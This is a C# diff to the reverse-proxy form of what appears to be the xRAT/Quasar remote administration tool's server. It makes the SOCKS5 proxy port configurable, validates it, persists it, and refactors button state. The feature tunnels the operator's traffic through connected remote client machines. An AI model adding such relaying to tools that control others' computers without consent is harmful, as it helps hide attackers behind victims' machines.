@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Globalization;
 using System.Net.Sockets;
 using System.Windows.Forms;
 using xServer.Core.Data;
@@ -40,18 +41,27 @@ namespace xServer.Forms
                 this.Text = WindowHelper.GetWindowTitle("Reverse Proxy", _clients[0]);
                 lblLoadBalance.Text = "The Load Balancer is not active, only 1 client is used, select multiple clients to activate the load balancer";
             }
+            nudServerPort.Value = Settings.ReverseProxyPort;
         }
 
         private void btnStart_Click(object sender, EventArgs e)
         {
             try
             {
+                ushort port = GetPortSafe();
+
+                if (port == 0)
+                {
+                    MessageBox.Show("Please enter a valid port > 0.", "Please enter a valid port", MessageBoxButtons.OK,
+                        MessageBoxIcon.Warning);
+                    return;
+                }
+
                 SocksServer = new ReverseProxyServer();
                 SocksServer.OnConnectionEstablished += socksServer_onConnectionEstablished;
                 SocksServer.OnUpdateConnection += socksServer_onUpdateConnection;
-                SocksServer.StartServer(_clients, "0.0.0.0", 4782);
-                btnStart.Enabled = false;
-                btnStop.Enabled = true;
+                SocksServer.StartServer(_clients, "0.0.0.0", port);
+                ToggleButtons(true);
 
                 _refreshTimer = new Timer();
                 _refreshTimer.Tick += RefreshTimer_Tick;
@@ -97,6 +107,13 @@ namespace xServer.Forms
             catch { }
         }
 
+        private ushort GetPortSafe()
+        {
+            var portValue = nudServerPort.Value.ToString(CultureInfo.InvariantCulture);
+            ushort port;
+            return (!ushort.TryParse(portValue, out port)) ? (ushort)0 : port;
+        }
+
         void socksServer_onUpdateConnection(ReverseProxyClient proxyClient)
         {
 
@@ -107,12 +124,18 @@ namespace xServer.Forms
 
         }
 
+        private void ToggleButtons(bool t)
+        {
+            btnStart.Enabled = !t;
+            nudServerPort.Enabled = !t;
+            btnStop.Enabled = t;
+        }
+
         private void btnStop_Click(object sender, EventArgs e)
         {
             if (_refreshTimer != null)
                 _refreshTimer.Stop();
-            btnStart.Enabled = true;
-            btnStop.Enabled = false;
+            ToggleButtons(false);
             if (SocksServer != null)
                 SocksServer.Stop();
 
@@ -126,6 +149,7 @@ namespace xServer.Forms
 
         private void FrmReverseProxy_FormClosing(object sender, FormClosingEventArgs e)
         {
+            Settings.ReverseProxyPort = GetPortSafe();
             //Stop the proxy server if still active
             btnStop_Click(sender, null);
 
@@ -138,7 +162,7 @@ namespace xServer.Forms
 
         private void nudServerPort_ValueChanged(object sender, EventArgs e)
         {
-            lblProxyInfo.Text = string.Format("Connect to this SOCKS5/HTTPS Proxy: 127.0.0.1:{0} (no user/pass)", nudServerPort.Value);
+            lblProxyInfo.Text = string.Format("Connect to this SOCKS5 Proxy: 127.0.0.1:{0} (no user/pass)", nudServerPort.Value);
         }
 
         private void LvConnections_RetrieveVirtualItem(object sender, RetrieveVirtualItemEventArgs e)
@@ -153,7 +177,7 @@ namespace xServer.Forms
                     {
                         connection.Client.EndPoint.ToString(),
                         connection.Client.Value.Country,
-                        (connection.HostName.Length > 0) ? string.Format("{0}  ({1})", connection.HostName, connection.TargetServer) : connection.TargetServer,
+                        (connection.HostName.Length > 0 && connection.HostName != connection.TargetServer) ? string.Format("{0}  ({1})", connection.HostName, connection.TargetServer) : connection.TargetServer,
                         connection.TargetPort.ToString(),
                         FileHelper.GetDataSize(connection.LengthReceived),
                         FileHelper.GetDataSize(connection.LengthSent),
